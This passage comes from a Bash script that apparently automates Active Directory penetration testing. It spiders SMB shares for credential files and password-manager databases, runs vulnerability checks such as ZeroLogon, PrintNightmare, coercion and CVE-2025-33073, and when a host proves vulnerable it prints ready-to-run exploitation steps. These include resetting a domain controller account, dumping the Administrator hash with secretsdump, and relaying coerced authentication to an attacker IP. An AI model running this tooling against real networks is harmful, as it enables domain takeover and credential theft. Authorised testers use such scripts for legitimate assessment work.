                    run_command "${smbmap} -H $i -u 'Guest' -p '' -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." >>"${Shares_dir}/smbmapDump_${user_var}/smb_files_${dc_domain}_${i}.txt"
                    run_command "${smbmap} -H $i -u ${rand_user} -p '' -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." >>"${Shares_dir}/smbmapDump_${user_var}/smb_files_${dc_domain}_${i}.txt"
                fi
                cd "${current_dir}" || exit
            done
        fi
    fi
    echo -e ""
}

ne_shares() {
    echo -e "${BLUE}[*] Enumerating Shares using netexec ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} --shares --log ${Shares_dir}/ne_shares_output_${user_var}.txt" 2>&1
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] Enumerating Shares using netexec (Guest and random user)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} -u Guest -p '' --shares --log ${Shares_dir}/ne_shares_nullsess_output_${user_var}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} -u ${rand_user} -p '' --shares --log ${Shares_dir}/ne_shares_nullsess_output_${user_var}.txt" 2>&1
    fi

    echo -e ""
}

ne_spider() {
    echo -e "${BLUE}[*] Spidering Shares using netexec ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M spider_plus -o OUTPUT=${Shares_dir}/ne_spider_plus_${user_var} EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${Shares_dir}/ne_spider_output_${user_var}.txt" 2>&1
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] Spidering Shares using netexec (Guest and random user)${NC}"
        run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} -u Guest -p '' -M spider_plus -o OUTPUT=${Shares_dir}/ne_spider_plus_${user_var} EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${Shares_dir}/ne_spider_nullsess_output_${user_var}.txt" 2>&1
        run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} -u ${rand_user} -p '' -M spider_plus -o OUTPUT=${Shares_dir}/ne_spider_plus_${user_var} EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${Shares_dir}/ne_spider_nullsess_output_${user_var}.txt" 2>&1
    fi
    echo -e ""
}

finduncshar_scan() {
    if ! stat "${FindUncommonShares}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
    else
        echo -e "${BLUE}[*] Enumerating Shares using FindUncommonShares${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] FindUncommonShares requires credentials ${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
            run_command "${python3} ${FindUncommonShares} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${curr_targets_list} --check-user-access --export-xlsx ${Shares_dir}/finduncshar_${user_var}.xlsx --kdcHost ${dc_FQDN} --no-ldap" 2>&1 | tee -a "${Shares_dir}/finduncshar_shares_output_${user_var}.txt"
        fi
    fi
    echo -e ""
}

finduncshar_fullscan() {
    if ! stat "${FindUncommonShares}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
    else
        echo -e "${BLUE}[*] Enumerating all Servers and Shares using FindUncommonShares${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] FindUncommonShares requires credentials ${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
            run_command "${python3} ${FindUncommonShares} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} --check-user-access --export-xlsx ${Shares_dir}/finduncshar_full_${user_var}.xlsx --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${Shares_dir}/finduncshar_shares_full_output_${user_var}.txt"
        fi
    fi
    echo -e ""
}

manspider_scan() {
    echo -e "${BLUE}[*] Spidering Shares using manspider ${NC}"
    if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
        echo -e "${PURPLE}[-] manspider does not support Kerberos authentication${NC}"
    else
        mkdir -p "${Shares_dir}/manspiderDump_${user_var}"
        echo -e "${CYAN}[*] Running manspider....${NC}"
        echo -e "${CYAN}[*] Searching for files with interesting filenames${NC}"
        run_command "${manspider} ${argument_manspider} ${curr_targets_list} -q -t 10 -f passw user admin account network login key logon cred -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
        #echo -e "${CYAN}[*] Searching for SSH keys${NC}"
        #run_command "${manspider} ${argument_manspider} ${curr_targets_list} -q -t 10 -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
        echo -e "${CYAN}[*] Searching for files with interesting extensions${NC}"
        run_command "${manspider} ${argument_manspider} ${curr_targets_list} -q -t 10 -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml cspkg publishsettings json cnf sql cmd -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
        echo -e "${CYAN}[*] Searching for Password manager files${NC}"
        run_command "${manspider} ${argument_manspider} ${curr_targets_list} -q -t 10 -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
        echo -e "${CYAN}[*] Searching for word passw in documents${NC}"
        run_command "${manspider} ${argument_manspider} ${curr_targets_list} -q -t 10 -c passw login -e docx xlsx xls pdf pptx csv -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
        #echo -e "${CYAN}[*] Searching for words in downloaded files${NC}"
        #run_command "${manspider} ${Shares_dir}/manspiderDump_${user_var} -q -t 100 -c passw key login -l ${Shares_dir}/manspiderDump_${user_var}" 2>&1 | tee -a "${Shares_dir}/manspider_output_${user_var}.txt"
        echo -e ""
    fi
}

sharehound_scan() {
    if ! stat "${sharehound}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of ShareHound${NC}"
    else
        echo -e "${BLUE}[*] Running network share scan using ShareHound${NC}"
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ShareHound does not support Kerberos authentication${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
            current_dir=$(pwd)
            mkdir -p "${Shares_dir}/sharehound_${user_var}/"
            cd "${Shares_dir}/sharehound_${user_var}/" || exit
            if [ "${nullsess_bool}" == true ]; then
                run_command "${sharehound} -au ${rand_user} -ap '' ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip} -ns ${dns_ip} --logfile ${Shares_dir}/sharehound_${user_var}/sharehound_null.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_nullsess_output.txt"
                if [ -s "opengraph.json" ]; then mv opengraph.json "opengraph_null_${user_var}.json"; fi
            fi
            run_command "${sharehound} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip} -ns ${dns_ip} --logfile ${Shares_dir}/sharehound_${user_var}/sharehound.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_output.txt"
            if [ -s "opengraph.json" ]; then mv opengraph.json "opengraph_${user_var}.json"; fi
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

sharehound_scan_allsubnets() {
    if ! stat "${sharehound}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of ShareHound${NC}"
    else
        echo -e "${BLUE}[*] Running network share scan using ShareHound${NC}"
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ShareHound does not support Kerberos authentication${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
            current_dir=$(pwd)
            mkdir -p "${Shares_dir}/sharehound_${user_var}/"
            cd "${Shares_dir}/sharehound_${user_var}/" || exit
            if [ "${nullsess_bool}" == true ]; then
                run_command "${sharehound} -au ${rand_user} -ap '' ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip} -ns ${dns_ip} --subnets --logfile ${Shares_dir}/sharehound_${user_var}/sharehound_null_subnets_.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_nullsess_subnets_output.txt"
                if [ -s "opengraph.json" ]; then mv opengraph.json "opengraph_null_subnets_${user_var}.json"; fi
            fi
            run_command "${sharehound} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -tf ${curr_targets_list} -ai ${dc_ip} -ns ${dns_ip} --subnets --logfile ${Shares_dir}/sharehound_${user_var}/sharehound_subnets.log" | tee -a "${Shares_dir}/sharehound_${user_var}/sharehound_subnets_output.txt"
            if [ -s "opengraph.json" ]; then mv opengraph.json "opengraph_subnets_${user_var}.json"; fi
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

smbclient_console() {
    if ! stat "${impacket_smbclient}" >/dev/null 2>&1; then
        echo -e "${RED}[-] smbclient.py not found! Please verify the installation of impacket ${NC}"
    else
        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}"
        read -rp ">> " smbclient_target </dev/tty
        while [ "${smbclient_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " smbclient_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening smbclient.py console on target: $smbclient_target ${NC}"
        if [ "${nullsess_bool}" == true ]; then
            run_command "${impacket_smbclient} ${argument_imp}Guest:''\\@${smbclient_target}" 2>&1 | tee -a "${Shares_dir}/impacket_smbclient_output_${user_var}.txt"
        else
            run_command "${impacket_smbclient} ${argument_imp}\\@${smbclient_target}" 2>&1 | tee -a "${Shares_dir}/impacket_smbclient_output_${user_var}.txt"
        fi
    fi
    echo -e ""
}

smbclientng_console() {
    if ! stat "${smbclientng}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of smbclientng${NC}"
    else
        echo -e "${BLUE}[*] Launching smbclientng${NC}"
        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}"
        read -rp ">> " smbclient_target </dev/tty
        while [ "${smbclient_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " smbclient_target </dev/tty
        done
        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then kdc_param="--kdcHost ${dc_FQDN}"; else kdc_param=""; fi
        run_command "${smbclientng} ${argument_p0dalirius} ${verbose_p0dalirius} --host ${smbclient_target} ${kdc_param}" 2>&1 | tee -a "${Shares_dir}/smbclientng_output_${user_var}.txt"
    fi
    echo -e ""
}

###### vuln_checks: Vulnerability checks
zerologon_check() {
    echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
    run_command "echo -n Y | ${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M zerologon --log ${Vulnerabilities_dir}/ne_zerologon_output_${dc_domain}.txt" 2>&1
    if grep -q "VULNERABLE" "${Vulnerabilities_dir}/ne_zerologon_output_${dc_domain}.txt"; then
        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}2. Obtain the Domain Admin's NT hash:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}3. Obtain the machine account hex encoded password:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}4. Restore the machine account password:${NC}" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>" | tee -a "${Vulnerabilities_dir}/zerologon_exploitation_steps_${dc_domain}.txt"
    fi
    echo -e ""
}

ms17-010_check() {
    echo -e "${BLUE}[*] MS17-010 check ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M ms17-010 --log ${Vulnerabilities_dir}/ne_ms17-010_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

coerceplus_check() {
    echo -e "${BLUE}[*] coerce check ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M coerce_plus --log ${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt" 2>&1
    if grep -q "VULNERABLE" "${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt"; then
        echo -e "${GREEN}[+] Target(s) vulnerable to coercing found! Consider checking for CVE-2025-33073 (https://github.com/mverschu/CVE-2025-33073). Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}1. Add DNS record pointing to the attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
        echo -e "${bloodyad} ${argument_bloodyad} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${attacker_IP}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}2. Use ntlmrelayx to run a listener and execute secretdump:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
        echo -e "ntlmrelayx.py -t smb://[ TARGET ] -smb2support" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
        echo -e "${CYAN}3. Coerce the target machine to connect back to your attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
        echo -e "${netexec} ${ne_verbose} smb [ TARGET ] ${argument_ne} -M coerce_plus -o M=PrinterBug L=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
    fi
    echo -e ""
}

coerce_netexec() {
    echo -e "${BLUE}[*] Coercing using netexec${NC}"

    echo -e "${YELLOW}[*] Please verify that ntlmrelayx or Responder are running, and then press ENTER to continue....${NC}"
    read -rp "" </dev/tty

    echo -e "${BLUE}[*] Please specify hostname of target server:${NC}"
    echo -e "${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}"
    target_coerce=""
    read -rp ">> " target_coerce </dev/tty
    while [ "${target_coerce}" == "" ]; do
        echo -e "${RED}Invalid target.${NC} Please specify target server:"
        read -rp ">> " target_coerce </dev/tty
    done
    echo -e "${CYAN}[*] Example: 10.10.10.10 or kali@80 or localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${NC}"
    set_attackerIP
    run_command "${netexec} ${ne_verbose} smb ${target_coerce} ${argument_ne} -M coerce_plus -o LISTENER="${attacker_IP}" --log ${Vulnerabilities_dir}/ne_coerce_attack_output_${dc_domain}.txt" 2>&1

    echo -e ""
}

print_check() {
    echo -e "${BLUE}[*] Print Spooler and PrintNightmare checks ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M spooler --log ${Vulnerabilities_dir}/ne_spooler_output_${dc_domain}.txt" 2>&1
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M printnightmare --log ${Vulnerabilities_dir}/ne_printnightmare_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

webdav_check() {
    echo -e "${BLUE}[*] WebDAV check ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M webdav --log ${Vulnerabilities_dir}/ne_webdav_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

smbsigning_check() {
    echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} --gen-relay-list ${Vulnerabilities_dir}/ne_smbsigning_output_${dc_domain}.txt" 2>&1
    if [ ! -s "${Vulnerabilities_dir}/ne_smbsigning_output_${dc_domain}.txt" ] && [ "${noexec_bool}" == "false" ]; then
        echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
    fi
    echo -e ""
}

smb_checks() {
    echo -e "${BLUE}[*] ntlmv1, smbghost, remove-mic checks ${NC}"
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M ntlmv1 --log ${Vulnerabilities_dir}/ne_ntlmv1_output_${dc_domain}.txt" 2>&1
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M smbghost --log ${Vulnerabilities_dir}/ne_smbghost_output_${dc_domain}.txt" 2>&1
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M remove-mic --log ${Vulnerabilities_dir}/ne_removemic_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

rpcdump_check() {
    if ! stat "${impacket_rpcdump}" >/dev/null 2>&1; then
        echo -e "${RED}[-] rpcdump.py not found! Please verify the installation of impacket${NC}"
    elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
        echo -e "${PURPLE}[-] rpcdump does not support Kerberos authentication${NC}"
    else
        mkdir -p "${Vulnerabilities_dir}/RPCDump"
        echo -e "${BLUE}[*] Impacket rpcdump${NC}"
        for i in $(/bin/cat "${curr_targets_list}"); do
            echo -e "${CYAN}[*] RPC Dump of ${i} ${NC}"
            run_command "${impacket_rpcdump} ${argument_imp}\\@$i" >"${Vulnerabilities_dir}/RPCDump/impacket_rpcdump_output_${i}.txt"
            inte_prot="MS-RPRN MS-PAR MS-EFSR MS-FSRVP MS-DFSNM MS-EVEN"
            for prot in $inte_prot; do
                prot_grep=$(grep -a "$prot" "${Vulnerabilities_dir}/RPCDump/impacket_rpcdump_output_${i}.txt")
                if [ ! "${prot_grep}" == "" ]; then
                    echo -e "${GREEN}[+] $prot_grep found at ${i}${NC}"
                fi
            done
        done
        echo -e ""
    fi
    echo -e ""
}

coercer_check() {
    if ! stat "${coercer}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Coercer not found! Please verify the installation of Coercer${NC}"
    elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
        echo -e "${PURPLE}[-] Coercer does not support Kerberos authentication${NC}"
    else
        mkdir -p "${Vulnerabilities_dir}/Coercer"
        echo -e "${BLUE}[*] Running scan using coercer ${NC}"
        run_command "${coercer} scan ${argument_coercer} -f ${curr_targets_list} --dc-ip ${dc_ip} --auth-type smb --export-xlsx ${Vulnerabilities_dir}/Coercer/coercer_output_${dc_domain}.xlsx" | tee "${Vulnerabilities_dir}/Coercer/coercer_output_${dc_domain}.txt"
        if grep -q -r "SMB  Auth" "${Vulnerabilities_dir}/Coercer/"; then
            echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
            echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
            echo -e "sudo responder -I ${attacker_interface}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
            echo -e "${CYAN}2. Coerce target server:${NC}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l ${attacker_IP} --dc-ip ${dc_ip}" | tee -a "${Vulnerabilities_dir}/coercer_exploitation_steps_${dc_domain}.txt"
        fi
        echo -e ""
    fi
    echo -e ""
}

privexchange_check() {
    if ! stat "${privexchange}" >/dev/null 2>&1; then
        echo -e "${RED}[-] privexchange.py not found! Please verify the installation of privexchange${NC}"
    else
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] privexchange does not support Kerberos authentication${NC}"
        else
            echo -e "${BLUE}[*] Use Exchange Web Services to call PushSubscription API using privexchange. Please specify hostname of Exchange server:${NC}"
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${YELLOW}[*] No credentials were provided, use ntlmrelayx and then modified httpattack.py, and then press ENTER to continue....${NC}"
                echo -e "cd /home/USER/.local/pipx/venvs/impacket/lib/python3.XX/site-packages/impacket/examples/ntlmrelayx/attacks/httpattack.py"
                echo -e "mv httpattack.py httpattack.py.old"
                echo -e "wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py"
                echo -e "sed -i 's/attacker_url = .*$/attacker_url = \$ATTACKER_URL/' httpattack.py"
                echo -e "ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx"
                read -rp "" </dev/tty
            fi
            echo -e "${BLUE}[*] Please specify hostname of Exchange server:${NC}"
            echo -e "${CYAN}[*] Example: 10.1.0.5 or EXCH01 or EXCH01.domain.com ${NC}"
            target_exchange=""
            read -rp ">> " target_exchange </dev/tty
            while [ "${target_exchange}" == "" ]; do
                echo -e "${RED}Invalid hostname.${NC} Please specify hostname of Exchange server:"
                read -rp ">> " target_exchange </dev/tty
            done
            set_attackerIP
            run_command "${python3} ${privexchange} ${argument_privexchange} -ah ${attacker_IP} ${target_exchange}" | tee "${Vulnerabilities_dir}/privexchange_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

runfinger_check() {
    if ! stat "${RunFinger}" >/dev/null 2>&1; then
        echo -e "${RED}[-] RunFinger.py not found! Please verify the installation of RunFinger${NC}"
    else
        echo -e "${BLUE}[*] Using RunFinger.py${NC}"
        current_dir=$(pwd)
        cd "${Vulnerabilities_dir}" || exit
        run_command "${python3} ${RunFinger} -f ${curr_targets_list}" | tee -a "${Vulnerabilities_dir}/RunFinger_${dc_domain}.txt"
        cd "${current_dir}" || exit
    fi
    echo -e ""
}

ldapnightmare_check() {
    if ! stat "${LDAPNightmare}" >/dev/null 2>&1; then
        echo -e "${RED}[-] LDAPNightmare (CVE-2024-49113-checker) not found! Please verify the installation of LDAPNightmare${NC}"
    else
        echo -e "${BLUE}[*] Running LDAPNightmare check against domain${NC}"
        run_command "${python3} ${LDAPNightmare} ${dc_ip_list}" | tee -a "${Vulnerabilities_dir}/LDAPNightmare_${dc_domain}.txt"
    fi
    echo -e ""
}

regsessions_check() {
    echo -e "${BLUE}[*] Enumerate active sessions from registry${NC}"
    run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} --reg-sessions --log ${Vulnerabilities_dir}/ne_reg-sessions_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

findunusess_check() {
    if ! stat "${FindUnusualSessions}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of FindUnusualSessions${NC}"
    else
        echo -e "${BLUE}[*] Finding unsual active sessions using FindUnusualSessions${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] FindUnusualSessions requires credentials ${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
            run_command "${python3} ${FindUnusualSessions} ${argument_p0dalirius_a} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${curr_targets_list} --export-xlsx ${Vulnerabilities_dir}/findususess_${dc_domain}.xlsx --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${Vulnerabilities_dir}/findususess_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

badsuccessor_check() {
    echo -e "${BLUE}[*] Running BadSuccessor check against domain${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M badsuccessor --log ${Vulnerabilities_dir}/ne_badsuccessor_output_${dc_domain}.txt" 2>&1
    echo -e ""
    if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of impacket{NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] badsuccessor.py requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
            echo -e "${CYAN}[*] Searching for identities with BadSuccessor privileges${NC}"
            run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action search" 2>&1 | tee -a "${Vulnerabilities_dir}/badsuccessor_search_${user_var}.txt"
        fi
    fi
    echo -e ""
}

###### mssql_checks: MSSQL scan
mssql_enum() {
    if ! stat "${windapsearch}" >/dev/null 2>&1 || ! stat "${impacket_GetUserSPNs}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
    else
        echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
        sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${Servers_dir}"/sql_list_*_"${dc_domain}.txt" 2>/dev/null | sort -uf >"${sql_hostname_list}" 2>&1
        if [ -s "${DomainRecon_dir}/dns_records_${dc_domain}.csv" ]; then
            for i in $(/bin/cat "${sql_hostname_list}"); do
                grep -i "$(echo "$i" | cut -d "." -f 1)" "${DomainRecon_dir}/dns_records_${dc_domain}.csv" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> "${sql_ip_list}"
            done
        fi
        if [ -s "${sql_ip_list}" ]; then
            sort -u "${sql_ip_list}" -o "${sql_ip_list}"
        fi
        if stat "${target_sql}" >/dev/null 2>&1; then
            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M enum_impersonate --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M enum_logins --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M enum_links --log ${MSSQL_dir}/ne_mssql_output_${user_var}.txt" 2>&1
        else
            echo -e "${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}"
        fi
    fi
    echo -e ""
}

mssql_relay_check() {
    if ! stat "${mssqlrelay}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of mssqlrelay${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] mssqlrelay requires credentials${NC}"
        else
            echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
